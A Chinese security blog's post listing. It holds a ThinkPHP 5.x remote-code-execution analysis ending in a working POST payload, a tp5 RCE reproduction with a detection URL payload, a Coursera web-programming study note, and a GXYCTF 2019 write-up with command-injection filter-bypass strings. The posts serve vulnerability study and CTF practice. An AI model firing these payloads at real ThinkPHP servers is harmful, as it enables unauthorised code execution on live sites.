<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$default</span> = array_pop(<span class="variable">$filters</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_callable(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                <span class="variable">$value</span> = call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_scalar(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 正则过滤</span></span><br><span class="line">                    <span class="keyword">if</span> (!preg_match(<span class="variable">$filter</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                    <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                    <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                    <span class="variable">$value</span> = filter_var(<span class="variable">$value</span>, is_int(<span class="variable">$filter</span>) ? <span class="variable">$filter</span> : filter_id(<span class="variable">$filter</span>));</span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p>
<p>且<code>$filter</code>=<code>$_POST</code></p>
<p>因此有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/public/</span><br><span class="line">POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</span><br></pre></td></tr></table></figure>



<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://www.smi1e.top/thinkphp-5-1-x5-2-x%E5%85%A8%E7%89%88%E6%9C%AC-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/01/29/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cku8k8fx8002id0ob012l4cen" data-title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tp5rce复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/29/tp5rce%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-01-29T16:00:00.000Z" itemprop="datePublished">2020-01-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/29/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tp5rce复现"><a href="#tp5rce复现" class="headerlink" title="tp5rce复现"></a>tp5rce复现</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
<h3 id="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。"><a href="#本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。" class="headerlink" title="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。"></a>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。</h3><p><strong>如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。</strong></p>
<p>–来自thinkphp官网</p>
</blockquote>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据官方的公告去寻找相关commit发现漏洞位置</p>
<p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p>
<p>查看所有调用controller的函数发现有个敏感的函数名exec,不过这个是tp自己实现的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 监听module_init</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 实例化控制器</span></span><br><span class="line">           <span class="variable">$instance</span> = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">               <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">               <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">               <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$instance</span> <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">               <span class="variable">$instance</span>-&gt;registerMiddleware();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException <span class="variable">$e</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$e</span>-&gt;getClass());</span><br><span class="line">       &#125;</span><br><span class="line">   ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>跟进controller</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">controller</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$layer</span> = <span class="string">&#x27;controller&#x27;</span>, <span class="variable">$appendSuffix</span> = <span class="literal">false</span>, <span class="variable">$empty</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$module</span>, <span class="variable">$class</span>) = <span class="keyword">$this</span>-&gt;parseModuleAndClass(<span class="variable">$name</span>, <span class="variable">$layer</span>, <span class="variable">$appendSuffix</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (class_exists(<span class="variable">$class</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__get(<span class="variable">$class</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$empty</span> &amp;&amp; class_exists(<span class="variable">$emptyClass</span> = <span class="keyword">$this</span>-&gt;parseClass(<span class="variable">$module</span>, <span class="variable">$layer</span>, <span class="variable">$empty</span>, <span class="variable">$appendSuffix</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__get(<span class="variable">$emptyClass</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">&#x27;class not exists:&#x27;</span> . <span class="variable">$class</span>, <span class="variable">$class</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进parseModuleAndClass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseModuleAndClass</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$layer</span>, <span class="variable">$appendSuffix</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$name</span>, <span class="string">&#x27;\\&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$class</span>  = <span class="variable">$name</span>;<span class="comment">//存在\</span></span><br><span class="line">            <span class="variable">$module</span> = <span class="keyword">$this</span>-&gt;request-&gt;module();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$module</span>, <span class="variable">$name</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$module</span> = <span class="keyword">$this</span>-&gt;request-&gt;module();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$class</span> = <span class="keyword">$this</span>-&gt;parseClass(<span class="variable">$module</span>, <span class="variable">$layer</span>, <span class="variable">$name</span>, <span class="variable">$appendSuffix</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$module</span>, <span class="variable">$class</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果存在\则直接返回数据,其中<code>$name</code>是我们可控内容,而<code>$name</code>也恰好是类名,于是我们可以通过调用命名空间\类来进行敏感操作</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查找手册,找到url访问的具体细节</p>
<p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p>
<p>于是有通杀tp5.0.x和tp5.1.x的检测payload</p>
<p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/01/29/tp5rce%E5%A4%8D%E7%8E%B0/" data-id="cku8k8fyt0069d0obhesm1c0g" data-title="tp5rce复现" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-coursera-杜克大学 程序设计与 Web 入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/24/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" class="article-date">
  <time class="dt-published" datetime="2020-01-24T16:00:00.000Z" itemprop="datePublished">2020-01-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/24/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/">coursera-杜克大学 程序设计与 Web 入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="coursera-杜克大学-程序设计与-Web-入门"><a href="#coursera-杜克大学-程序设计与-Web-入门" class="headerlink" title="coursera-杜克大学 程序设计与 Web 入门"></a>coursera-杜克大学 程序设计与 Web 入门</h1><h2 id="在coursera上学习的感受"><a href="#在coursera上学习的感受" class="headerlink" title="在coursera上学习的感受"></a>在coursera上学习的感受</h2><p>我觉得最大的优点是:教学和练习同时进行,极大的帮助了我快速掌握知识,这是我最喜欢的一点.但是对于中国境内的视频 加载有点难受,不过可以通过修改hosts来改善.</p>
<p>虽然这种教学方式我很喜欢,但是由于我的课程选择不太适合我自己(太基础了),导致我其实没学到啥,但是我还是硬着头皮看完了(闲得无聊?),选择适合自己的课程真的特别重要</p>
<h2 id="提问问题的注意事项"><a href="#提问问题的注意事项" class="headerlink" title="提问问题的注意事项"></a>提问问题的注意事项</h2><p><strong>详细</strong>,<strong>清楚</strong>的描述自己遇到的问题,及自己尝试解决问题的结果</p>
<h2 id="css语法"><a href="#css语法" class="headerlink" title="css语法"></a>css语法</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.classname</span>&#123;</span><br><span class="line">    preperty:value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#ID</span>&#123;</span><br><span class="line">    preperty:value;</span><br><span class="line">&#125;</span><br><span class="line">tagname &#123;</span><br><span class="line">    preperty:value;</span><br><span class="line">&#125;</span><br><span class="line">;or</span><br><span class="line">tag1 tag2 &#123;</span><br><span class="line">    preperty:value;</span><br><span class="line">&#125;</span><br><span class="line">;这个会修改tag1下的tag2</span><br></pre></td></tr></table></figure>



<h2 id="css资料"><a href="#css资料" class="headerlink" title="css资料"></a>css资料</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p> <a target="_blank" rel="noopener" href="https://www.w3schools.com/css/css_border.asp">https://www.w3schools.com/css/css_border.asp</a> </p>
<h3 id="css-colors"><a href="#css-colors" class="headerlink" title="css colors"></a>css colors</h3><p> <a target="_blank" rel="noopener" href="https://www.w3schools.com/cssref/css_colors.asp">https://www.w3schools.com/cssref/css_colors.asp</a> </p>
<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool">https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool</a></p>
<p> <a target="_blank" rel="noopener" href="http://www.w3schools.com/colors/colors_picker.asp">http://www.w3schools.com/colors/colors_picker.asp</a></p>
<h2 id="用编程解决问题的七步骤"><a href="#用编程解决问题的七步骤" class="headerlink" title="用编程解决问题的七步骤"></a>用编程解决问题的七步骤</h2><ol>
<li>Work example by hand.<br>清晰的认识要解决的问题,并手动尝试解决</li>
<li>Write down what you did.<br>写下自己解决问题的过程(只针对这个具体的例子),不要忽略我们理所当然的东西,计算机不会这么想,我们要尽可能的详细,精确的记录我们解决问题的步骤</li>
<li>Find patterns.<br>将过程抽象成解决这个问题的一般性步骤,注意重复的步骤(变为循环语句),注意判断(变为条件语句)</li>
<li>Check by hand.<br>用具体的例子来检验抽象的步骤是否能解决问题</li>
<li>Translate to code. </li>
<li> Run test cases. </li>
<li>Debug failed test cases.<br>一般可以把问题分为:步骤问题(如没考虑某些特殊情况)和将步骤转为程序时(如函数用错)的问题</li>
</ol>
<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="手册"><a href="#手册" class="headerlink" title="手册"></a>手册</h3><p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/">https://developer.mozilla.org/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.w3schools.com/">https://www.w3schools.com/</a> </p>
<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> SimpleImage(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> pixel <span class="keyword">of</span> img.values())</span><br><span class="line">&#123;<span class="comment">//pixel是img.values()的引用</span></span><br><span class="line">    pixel.setRed(<span class="number">255</span>);</span><br><span class="line">    pixel.setGreen(<span class="number">255</span>);</span><br><span class="line">    pixel.setBlue(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(img);</span><br></pre></td></tr></table></figure>





<h3 id="canvas操作"><a href="#canvas操作" class="headerlink" title="canvas操作"></a>canvas操作</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas=<span class="built_in">document</span>.getElementById(<span class="string">&quot;show2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> context = canvas.getContext(<span class="string">&#x27;2d&#x27;</span>);</span><br><span class="line">#init</span><br><span class="line">context.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">#clear canvas</span><br><span class="line">context.font = <span class="string">&quot;30px Arial&quot;</span>;</span><br><span class="line">context.fillText(<span class="string">&quot;Hello World&quot;</span>, <span class="number">10</span>, <span class="number">50</span>);</span><br><span class="line">#draw a text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.fillStyle = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">context.fillRect(<span class="number">10</span>, <span class="number">10</span>, <span class="number">150</span>, <span class="number">80</span>);</span><br><span class="line">#draw rectangle</span><br></pre></td></tr></table></figure>



<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><p>当变量是数字和字符串的时候,会生成一个拷贝,再赋值给目标</p>
<p>但如果对象是数组和对象时,这会将引用赋值给目标,此时修改新变量也会影响到旧变量</p>
<h2 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><code>&lt;input type=&quot;color&quot; id=&quot;color&quot; value=&quot;pink&quot; onchange=&quot;colorchange()&quot;&gt;</code></p>
<h4 id="botton"><a href="#botton" class="headerlink" title="botton"></a>botton</h4><p><code>&lt;input type=&quot;button&quot; value=&quot;make pink&quot; onclick=&quot;makepink()&quot;&gt;</code></p>
<h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p><code>&lt;input type=&quot;range&quot; min=&quot;10&quot; max=&quot;100&quot; value=&quot;10&quot; id=&quot;slr&quot; oninput=doSquare()&gt;</code></p>
<h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>onclick,onchage,oninput</p>
<h2 id="给自己的建议"><a href="#给自己的建议" class="headerlink" title="给自己的建议"></a>给自己的建议</h2><blockquote>
<p>合格的程序员不应该浪费很多时间用于程序调试,他们应该一开始就不要把故障引入.</p>
<p>—-迪杰斯特拉</p>
</blockquote>
<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p><img src="https://i.loli.net/2020/01/20/bmQ5AvDenOHlqP7.png" alt="image2319"></p>
<p>发现bug-&gt;明确目的(了解bug发生的原因及解决方法)-&gt;收集信息-&gt;(多次)提出猜想(where,why)(要具有可测试性)-&gt;验证-&gt;解决</p>
<h2 id="final-work"><a href="#final-work" class="headerlink" title="final work"></a>final work</h2><p> <a target="_blank" rel="noopener" href="https://codepen.io/explorersss/full/wvBOwmR">https://codepen.io/explorersss/full/wvBOwmR</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/01/24/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" data-id="cku8k8fxp003td0obfb3n9c8g" data-title="coursera-杜克大学 程序设计与 Web 入门" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-gxyctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/26/gxyctf2019/" class="article-date">
  <time class="dt-published" datetime="2019-12-26T16:00:00.000Z" itemprop="datePublished">2019-12-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/26/gxyctf2019/">gxytf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="gxyctf"><a href="#gxyctf" class="headerlink" title="gxyctf"></a>gxyctf</h1><h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>过滤$,’ ‘,</p>
<p>未过滤符号:<code>!,#,$,%,(,.,+,-,:,;,=</code></p>
<p>过滤空格用$IFS来代替</p>
<p>过滤flag</p>
<p>用base64来绕过</p>
<p><code>aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">	print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><strong>没做出来忽略他</strong></p>
<p>上传类型也太露骨了把:检测后缀还是上传类型?</p>
<p>Content-Type: image/jpeg,可以上传了</p>
<p>上传文件后无法访问404</p>
<p>上传文件所在文件夹和session有关</p>
<p>将session置空后报错</p>
